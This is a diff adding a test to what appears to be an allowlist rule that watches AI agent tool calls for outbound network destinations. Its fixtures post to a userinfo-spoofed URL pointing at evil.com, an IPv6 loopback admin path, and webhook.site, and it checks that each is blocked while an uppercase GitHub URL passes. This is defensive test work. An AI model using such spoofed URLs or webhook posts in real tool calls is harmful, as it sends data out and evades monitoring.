@@ -165,3 +165,66 @@ def test_forbidden_pattern_takes_precedence_over_unallowed_domain():
 
     assert len(violations) == 1
     assert violations[0].evidence["reason"] == "forbidden_destination_pattern"
+
+
+def test_userinfo_spoofing_and_ipv6_are_blocked_while_uppercase_allowlist_passes():
+    rule = _rule()
+
+    spoofed = {
+        "spans": [
+            {
+                "span_id": "span-spoof",
+                "step_index": 0,
+                "span_type": "tool.call",
+                "name": "post_data",
+                "permission_tier": "net",
+                "input_parameters": {"url": "https://api.github.com@evil.com/leak"},
+            }
+        ]
+    }
+    spoof_violations = rule.evaluate(spoofed)
+    assert len(spoof_violations) == 1
+    assert spoof_violations[0].evidence["reason"] == "domain_not_in_allowlist"
+    assert spoof_violations[0].evidence["domain"] == "evil.com"
+
+    ipv6 = {
+        "spans": [
+            {
+                "span_id": "span-ipv6",
+                "step_index": 0,
+                "span_type": "tool.call",
+                "name": "post_data",
+                "permission_tier": "net",
+                "input_parameters": {"url": "http://[::1]/admin"},
+            }
+        ]
+    }
+    assert len(rule.evaluate(ipv6)) == 1
+
+    bare_forbidden = {
+        "spans": [
+            {
+                "span_id": "span-bare",
+                "step_index": 0,
+                "span_type": "tool.call",
+                "name": "post_data",
+                "permission_tier": "net",
+                "input_parameters": {"destination": "webhook.site/abc"},
+            }
+        ]
+    }
+    assert len(rule.evaluate(bare_forbidden)) == 1
+
+    uppercase_allowed = {
+        "spans": [
+            {
+                "span_id": "span-upper",
+                "step_index": 0,
+                "span_type": "tool.call",
+                "name": "post_data",
+                "permission_tier": "net",
+                "input_parameters": {"url": "https://API.GITHUB.COM/repos/org/repo"},
+            }
+        ]
+    }
+    assert rule.evaluate(uppercase_allowed) == []
